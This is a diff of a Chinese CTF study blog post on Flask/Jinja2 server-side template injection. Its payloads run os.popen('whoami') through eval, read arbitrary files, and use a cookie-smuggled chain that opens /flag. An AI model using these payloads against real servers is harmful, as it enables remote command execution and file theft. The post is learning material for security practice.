@@ -12,7 +12,7 @@
   <meta itemprop="description" content="Flask之SSTI模版注入参考博客：[flask之ssti模版注入从零到入门](flask之ssti模版注入从零到入门 - 先知社区)">
   <meta itemprop="datePublished" content="2024-07-01T11:25:40+08:00">
   <meta itemprop="dateModified" content="2024-07-01T11:25:40+08:00">
-  <meta itemprop="wordCount" content="400">
+  <meta itemprop="wordCount" content="411">
   <meta itemprop="keywords" content="Web,做题,模板注入"><meta property="og:url" content="http://localhost:1313/posts/2024web-ssti-flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">
   <meta property="og:site_name" content="Ting BLOG🐈">
   <meta property="og:title" content="SSTI-Flask模板注入">
@@ -41,7 +41,7 @@
     "mainEntityOfPage": {
       "@type": "WebPage",
       "@id": "http:\/\/localhost:1313\/posts\/2024web-ssti-flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5\/"
-    },"genre": "posts","keywords": "Web, 做题, 模板注入","wordcount":  400 ,
+    },"genre": "posts","keywords": "Web, 做题, 模板注入","wordcount":  411 ,
     "url": "http:\/\/localhost:1313\/posts\/2024web-ssti-flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5\/","datePublished": "2024-07-01T11:25:40+08:00","dateModified": "2024-07-01T11:25:40+08:00","publisher": {
       "@type": "Organization",
       "name": ""},"author": {
@@ -145,7 +145,7 @@
   <article class="page single">
     <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>SSTI-Flask模板注入</span>
       </h1></div><div class="post-meta">
-      <div class="post-meta-line"><span class="post-author"><a href="Tin10g.github.io" title="Author" rel=" author" class="author"><img loading="lazy" src="https://img.picui.cn/free/2024/10/25/671b813cb6b0a.png" alt="Ting" data-title="Ting" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;Ting</a></span><span class="post-included-in">&nbsp;included in <a href="/categories/web--2024%E7%AC%94%E8%AE%B0/" class="post-category" title="Category - Web · 2024笔记"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Web · 2024笔记</a></span></div><div class="post-meta-line"><span title="published on 2024-07-01 11:25:40"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-07-01">2024-07-01</time></span>&nbsp;<span title="400 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 500 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>2 minutes</span>&nbsp;</div>
+      <div class="post-meta-line"><span class="post-author"><a href="Tin10g.github.io" title="Author" rel=" author" class="author"><img loading="lazy" src="https://img.picui.cn/free/2024/10/25/671b813cb6b0a.png" alt="Ting" data-title="Ting" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;Ting</a></span><span class="post-included-in">&nbsp;included in <a href="/categories/web--2024%E7%AC%94%E8%AE%B0/" class="post-category" title="Category - Web · 2024笔记"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Web · 2024笔记</a></span></div><div class="post-meta-line"><span title="published on 2024-07-01 11:25:40"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-07-01">2024-07-01</time></span>&nbsp;<span title="411 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 500 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>2 minutes</span>&nbsp;</div>
     </div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>Contents</span>
@@ -654,6 +654,23 @@
 </span></span><span class="line"><span class="cl"><span class="err">原理就是找到含有</span> <span class="n">__builtins__</span> <span class="err">的类，然后利用。</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="p">[]</span><span class="o">.</span><span class="n">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="n">__name__</span><span class="o">==</span><span class="s1">&#39;catch_warnings&#39;</span> <span class="o">%</span><span class="p">}{{</span> <span class="n">c</span><span class="o">.</span><span class="n">__init__</span><span class="o">.</span><span class="n">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">eval</span><span class="p">(</span><span class="s2">&#34;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&#34;</span><span class="p">)</span> <span class="p">}}{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="n">endfor</span> <span class="o">%</span><span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="p">[]</span><span class="o">.</span><span class="n">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="n">__name__</span><span class="o">==</span><span class="s1">&#39;catch_warnings&#39;</span> <span class="o">%</span><span class="p">}{{</span> <span class="n">c</span><span class="o">.</span><span class="n">__init__</span><span class="o">.</span><span class="n">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s1">&#39;filename&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="p">}}{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="n">endfor</span> <span class="o">%</span><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># request.cookie
+</span></span><span class="line"><span class="cl">{{self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&#34;/flag&#34;).read()}}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">{{self[request.cookies.di][request.cookies.temp][request.cookies.lip][request.cookies.glo][request.cookies.bui].open(request.cookies.cmd).read()}}
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">cookie:di=__dict__;temp=_TemplateReference__context;lip=lipsum;glo=__globals__;bui=__builtins__;cmd=flag</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="漏洞挖掘" class="heading-element"><span>漏洞挖掘</span>
   <a href="#%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98" class="heading-mark">
